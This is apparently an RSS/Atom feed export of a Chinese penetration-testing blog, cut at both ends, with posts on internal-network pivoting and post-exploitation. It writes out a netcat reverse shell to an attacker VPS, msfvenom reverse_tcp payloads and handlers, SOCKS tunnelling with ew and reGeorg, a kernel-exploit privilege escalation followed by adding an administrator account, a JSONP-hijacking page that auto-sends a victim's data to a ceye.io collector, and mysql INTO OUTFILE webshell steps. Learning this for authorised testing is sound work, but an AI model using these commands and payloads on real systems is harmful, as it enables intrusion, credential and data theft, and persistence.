plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/server/socks4a</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>编辑/etc/proxychains.conf  最后一行加上</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socks4 0.0.0.0 1080</span><br></pre></td></tr></table></figure><p>通过代理用nmap来扫描内网的web服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 nmap -sT -Pn -p445,80 --open 10.11.2.0/24</span><br><span class="line"></span><br><span class="line">[proxychains] Strict chain  ...  0.0.0.0:1080  ...  10.11.2.128:80  ...  OK</span><br><span class="line">[proxychains] Strict chain  ...  0.0.0.0:1080  ...  10.11.2.225:445  ...  OK</span><br><span class="line"></span><br><span class="line">Nmap scan report for 10.11.2.128</span><br><span class="line">Host is up (6.9s latency).</span><br><span class="line">Not shown: 1 closed port</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">80/tcp open  http</span><br><span class="line"></span><br><span class="line">Nmap scan report for 10.11.2.225</span><br><span class="line">Host is up (8.5s latency).</span><br><span class="line">Not shown: 1 closed port</span><br><span class="line">PORT    STATE SERVICE</span><br><span class="line">445/tcp open  microsoft-ds</span><br></pre></td></tr></table></figure><p>成功的扫描到了我的物理机和路由器</p><p>说明用域名上线走http的meterpreter，也是可以执行一些内网渗透方面的内容，当然，速度上感觉比tcp的慢了许多。</p><p>至于tcp和http不同方式上线，是否会导致某些msf模块无法使用，需要在后续的过程中慢慢摸索，我只发现了有很多模块http和tcp都无法通过代理的方式使用，如nmap的ping存活扫描，arp扫描等。</p><p>以上便是我最近在cs和msf域名上线上学习的一点心得体会，感谢各位师傅的阅读。</p><p>c</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="红队" scheme="https://legoc.github.io/categories/红队/"/>
    
    
    <category term="渗透测试" scheme="https://legoc.github.io/tags/渗透测试/"/>
    
    <category term="内网" scheme="https://legoc.github.io/tags/内网/"/>
    
    <category term="红队" scheme="https://legoc.github.io/tags/红队/"/>
    
  </entry>
  
  <entry>
    <title>我好吗?-太阳如常升起</title>
    <link href="https://legoc.github.io/2019/05/27/%E6%88%91%E5%A5%BD%E5%90%97-%E5%A4%AA%E9%98%B3%E5%A6%82%E5%B8%B8%E5%8D%87%E8%B5%B7/"/>
    <id>https://legoc.github.io/2019/05/27/%E6%88%91%E5%A5%BD%E5%90%97-%E5%A4%AA%E9%98%B3%E5%A6%82%E5%B8%B8%E5%8D%87%E8%B5%B7/</id>
    <published>2019-05-27T12:48:10.000Z</published>
    <updated>2019-12-23T11:22:32.629Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="请输入密码查看" />    <label for="pass">请输入密码查看</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none">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</div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">文章已被加密</summary>
    
    
    
    <category term="随笔" scheme="https://legoc.github.io/categories/随笔/"/>
    
    
    <category term="杂谈" scheme="https://legoc.github.io/tags/杂谈/"/>
    
    <category term="人生" scheme="https://legoc.github.io/tags/人生/"/>
    
  </entry>
  
  <entry>
    <title>从webshell到3389</title>
    <link href="https://legoc.github.io/2019/05/18/%E4%BB%8Ewebshell%E5%88%B03389/"/>
    <id>https://legoc.github.io/2019/05/18/%E4%BB%8Ewebshell%E5%88%B03389/</id>
    <published>2019-05-18T11:57:38.000Z</published>
    <updated>2019-11-26T02:25:26.588Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><hr><p>title: 从webshell到3389<br>date: 2019-05-18 19:57:38<br>tags:</p><ul><li>内网渗透</li><li>端口与代理转发</li><li>提权<br>categories: 渗透测试</li></ul><hr><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>之前玩过一下linux下的提权，前段时间在上课的时候看了亮神的文章，感觉渗透还是不应该只停留在web层面。虽然说连WEB层面的东西都还没搞懂，但是还是想拓宽一下自己的攻击思路。当拿到了一个webshell之后，还能干什么呢？之前挖SRC，运气好也撞到过一个RCE，但是这些都只能停留在拿了shell之后，就不能再测下去了，后渗透这块，完全不清楚，虽然这次还是没有接触到域渗透，但是学了一些内网与代理之类的知识，还是做个小结为好。</p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="一些信息"><a href="#一些信息" class="headerlink" title="一些信息"></a>一些信息</h2><p>首先</p><p>拿到了一台服务器的webshell，这台机的状况</p><ul><li>只有一个内网IP</li><li>webshell权限 nt authority\network service（非system）可以执行命令</li><li>Microsoft Windows Server 2008 R2</li><li>systeminfo 补丁到 [246]: KB4034733（补丁最后时间大概在2016年左右）</li><li>不存在域</li></ul><p>由于在内网里面，很多操作需要用到代理。</p><p>内网端口转发：阿烨师傅的文章 <a href="https://www.jianshu.com/p/735e8f1746f0" target="_blank" rel="noopener">https://www.jianshu.com/p/735e8f1746f0</a></p><p>我个人使用了</p><h2 id="ew"><a href="#ew" class="headerlink" title="ew"></a>ew</h2><p>我尝试了用连接 本机-vps-webshell</p><p>ps:如果需要交互可以上传一个nc和cmd 反弹cmd</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vul: nc -e cmd.exe yourvps 2333</span><br><span class="line">vps: nc -lvvp 2333</span><br></pre></td></tr></table></figure><p>一般ew是会被杀，暂时没有了解免杀方面的知识</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vul: ew -s rssocks -d yourvps -e 2333</span><br><span class="line">vps: ./ew_for_linux64 -s rcsocks -l 1080 -e 2333</span><br></pre></td></tr></table></figure><p>自己的电脑可以直接上个代理</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">地址: yourvps 2333</span><br></pre></td></tr></table></figure><h2 id="reGeorg与Proxifier"><a href="#reGeorg与Proxifier" class="headerlink" title="reGeorg与Proxifier"></a>reGeorg与Proxifier</h2><p>详细可以看 <a href="https://xz.aliyun.com/t/228" target="_blank" rel="noopener">https://xz.aliyun.com/t/228</a></p><p>上传tunnel.aspx</p><p>访问显示</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Georg says, &apos;All seems fine</span><br></pre></td></tr></table></figure><p>运行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python reGeorgSocksProxy.py -p 9999 -u http://xxxxxx.com/tunnel.asp</span><br></pre></td></tr></table></figure><p>设置代理服务器为9999</p><p>设置好代理之后就可以3389链接了</p><p>连接地址：vul的内网ip</p><h2 id="上传meterpreter"><a href="#上传meterpreter" class="headerlink" title="上传meterpreter"></a>上传meterpreter</h2><p>渗透自然少不了metaspolit</p><p>在拿了webshell之后，上次一个meterpreter上去会方便很多操作，</p><p>可以参考亮神的Micro8</p><p><a href="https://micro8.gitbook.io/micro8/contents-1/1-10/10msfvenom-chang-yong-sheng-cheng-payload-ming-ling" target="_blank" rel="noopener">https://micro8.gitbook.io/micro8/contents-1/1-10/10msfvenom-chang-yong-sheng-cheng-payload-ming-ling</a></p><p>我在腾讯云上生成好像在运行的时候报错了，所以我直接在我的windows上生成了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=yourvps LPORT=2334 -f exe &gt; payload.exe</span><br></pre></td></tr></table></figure><p>在vps上</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">set lhost yourvps</span><br><span class="line">set lport 2334</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p>获取到会话</p><p>关于meterpreter的操作可以参考先知社区的 <a href="https://xz.aliyun.com/t/2536" target="_blank" rel="noopener">https://xz.aliyun.com/t/2536</a></p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>meterpreter的某些操作需要足够的权限，以及我并没有一个可以登入3389的账户，webshell本身权限也不够，所以提权是必不可少的。</p><p>同样的亮神的第一课和第二课都是关于提权的。</p><p>windows下的提权</p><p>对外公开的exp: <a href="https://github.com/SecWiki/windows-kernel-exploits" target="_blank" rel="noopener">https://github.com/SecWiki/windows-kernel-exploits</a></p><p>我选择了CVE-2018-8639来提权</p><p><a href="https://github.com/ze0r/CVE-2018-8639-exp" target="_blank" rel="noopener">https://github.com/ze0r/CVE-2018-8639-exp</a></p><p>exp.exe </p><p>再whoami,权限变成了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nt authority\system</span><br></pre></td></tr></table></figure><p>添加一个账户并且给他管理员</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net user test password /add</span><br><span class="line">net localgroup administrators test /add</span><br></pre></td></tr></table></figure><p>reGeorg与Proxifier配合使用登入3389</p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>这次算是了解了一些内网方面的知识，因为环境有限没发现有其他可下一步内网漫游的方向，所以只能到此为止，有机会再看看能不能接触域渗透方面的知识。</p><p>配个图：安利一个好工具冰蝎 <a href="https://github.com/rebeyond/Behinder" target="_blank" rel="noopener">https://github.com/rebeyond/Behinder</a></p><p><img src="/2019/05/18/从webshell到3389/1.png" alt=""></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="渗透测试" scheme="https://legoc.github.io/categories/渗透测试/"/>
    
    
    <category term="提权" scheme="https://legoc.github.io/tags/提权/"/>
    
    <category term="内网渗透" scheme="https://legoc.github.io/tags/内网渗透/"/>
    
    <category term="端口与代理转发" scheme="https://legoc.github.io/tags/端口与代理转发/"/>
    
  </entry>
  
  <entry>
    <title>用ceye来利用jsonp劫持</title>
    <link href="https://legoc.github.io/2019/05/01/%E7%94%A8ceye%E6%9D%A5%E5%88%A9%E7%94%A8jsonp%E5%8A%AB%E6%8C%81/"/>
    <id>https://legoc.github.io/2019/05/01/%E7%94%A8ceye%E6%9D%A5%E5%88%A9%E7%94%A8jsonp%E5%8A%AB%E6%8C%81/</id>
    <published>2019-05-01T13:49:30.000Z</published>
    <updated>2019-05-01T14:55:37.125Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>之前测jsonp劫持的时候一般是弹个alert，就做poc了，</p><p>突然想试试实际利用一下是什么样子，于是就开始尝试做个实际利用的poc。</p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>在网上看到一般的证明脚本是</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">function lego(json)&#123;</span></span><br><span class="line"><span class="undefined">alert(JSON.stringify(json))</span></span><br><span class="line"><span class="undefined">  &#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"http://vulweb.com/info?callback=lego"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>于是我便想尝试一下去构造一个可以来直接利用的exp</p><p>在安全客上看到了关于jsonp劫持的exp<a href="https://www.anquanke.com/post/id/152339" target="_blank" rel="noopener">https://www.anquanke.com/post/id/152339</a></p><p>因为这个脚本利用的是get方法</p><p>如果劫持到的数据过多，用get请求的时候会返回414（URI太长 ）</p><p>于是我就想用post的方法去请求</p><p>这种exp不能自动发起请求，需要点击按键。</p><p><img src="/2019/05/01/用ceye来利用jsonp劫持/1.jpg" alt="ctf"></p><p>与CSRF利用一样，如果用burpsuite生成的csrf-poc是用个submit按钮的，</p><p>在实际利用中还是差一点的，</p><p>所以我还是想让它变得更加实用一点。</p><p>首先是使用onload事件，</p><p><code>&lt;body onload=&quot;load()&quot;&gt;</code></p><p>即页面加载完成后执行一个方法，</p><p>这个方法利用有post请求，就可以完成我所想实现的了。</p><p>exp</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>JSONP EXP跨域测试<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">"load()"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"http://www.w3school.com.cn/jquery/jquery-1.11.1.min.js"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">function load()</span></span><br><span class="line"><span class="undefined">&#123;</span></span><br><span class="line"><span class="undefined">$.ajax(&#123;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">url: "http://xxx.com/info?callback=lego",</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">type: "GET",       //指定GET请求方法</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">dataType: "jsonp", //指定服务器返回的数据类型</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">jsonp: "callback", //指定参数名称</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">jsonpCallback: "lego",</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">success: function (data) &#123;</span></span><br><span class="line"><span class="undefined">$.ajax(&#123;</span></span><br><span class="line"><span class="undefined">  type: 'POST',</span></span><br><span class="line"><span class="undefined">  url: 'http://yourceye.ceye.io/',</span></span><br><span class="line"><span class="undefined">  data: JSON.stringify(data)</span></span><br><span class="line"><span class="undefined">&#125;);</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">&#125;)</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>当然，需要在ceye.io中注册一个账号。</p><p>效果</p><p><img src="/2019/05/01/用ceye来利用jsonp劫持/2.jpg" alt="ctf"></p><p>当然这也不是什么很有技术内容的文章，只是想跟大家分享一下一些小trick，多多包涵。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="SRC" scheme="https://legoc.github.io/categories/SRC/"/>
    
    
    <category term="前端黑客" scheme="https://legoc.github.io/tags/前端黑客/"/>
    
    <category term="jsonp劫持" scheme="https://legoc.github.io/tags/jsonp劫持/"/>
    
  </entry>
  
  <entry>
    <title>渗透知识小结</title>
    <link href="https://legoc.github.io/2019/03/22/%E6%B8%97%E9%80%8F%E4%BF%A1%E6%81%AF%E7%9F%A5%E5%B0%8F%E7%BB%93/"/>
    <id>https://legoc.github.io/2019/03/22/%E6%B8%97%E9%80%8F%E4%BF%A1%E6%81%AF%E7%9F%A5%E5%B0%8F%E7%BB%93/</id>
    <published>2019-03-22T11:10:10.000Z</published>
    <updated>2019-12-08T04:57:50.401Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h3 id="jfrog-artifactory"><a href="#jfrog-artifactory" class="headerlink" title="jfrog artifactory"></a>jfrog artifactory</h3><h4 id="什么是Artifactory"><a href="#什么是Artifactory" class="headerlink" title="什么是Artifactory?"></a>什么是Artifactory?</h4><p>一句话，开源的Maven仓库管理者</p><p>默认账号密码 admin password</p><h3 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">首先进入information_schema 数据库</span><br><span class="line">use information_schema;</span><br><span class="line">select concat(round(sum(DATA_LENGTH/1024/1024),2),&apos;MB&apos;) as data from TABLES;（查看所有数据库大小）</span><br><span class="line">select concat(round(sum(DATA_LENGTH/1024/1024),2),&apos;MB&apos;) as data from TABLES where table_schema=&apos;CarData&apos;;（查看指定数据库大小）</span><br></pre></td></tr></table></figure><h3 id="redis"><a href="#redis" class="headerlink" title="redis"></a>redis</h3><h4 id="连接"><a href="#连接" class="headerlink" title="连接"></a>连接</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h &#123;host&#125; -p &#123;port&#125;</span><br><span class="line">redis-cli -h 122.152.236.201 -p 6379</span><br></pre></td></tr></table></figure><p>getshell的三种方式</p><ul><li>知道网站绝对路径 备份拿webshell</li><li>写ssh-key拿shell</li><li>crontabs 定时任务反弹shell</li><li></li></ul><h3 id="mysql拿shell"><a href="#mysql拿shell" class="headerlink" title="mysql拿shell"></a>mysql拿shell</h3><h4 id="xampp和phpstudy这些集成的环境可以根据默认路径来拿"><a href="#xampp和phpstudy这些集成的环境可以根据默认路径来拿" class="headerlink" title="xampp和phpstudy这些集成的环境可以根据默认路径来拿"></a>xampp和phpstudy这些集成的环境可以根据默认路径来拿</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select @@basedir</span><br><span class="line">select &quot; &lt;?php phpinfo(); ?&gt; &quot; into outfile &quot;C:\inetpub\wwwroot\3.php&quot;</span><br><span class="line">select  LOAD_FILE(&quot;C:\inetpub\wwwroot\Server.php&quot;)</span><br></pre></td></tr></table></figure><h4 id="查看mysql导出权限"><a href="#查看mysql导出权限" class="headerlink" title="查看mysql导出权限"></a>查看mysql导出权限</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">show variables like &apos;%secure%&apos;;</span><br><span class="line">secure_file_priv 为 NULL 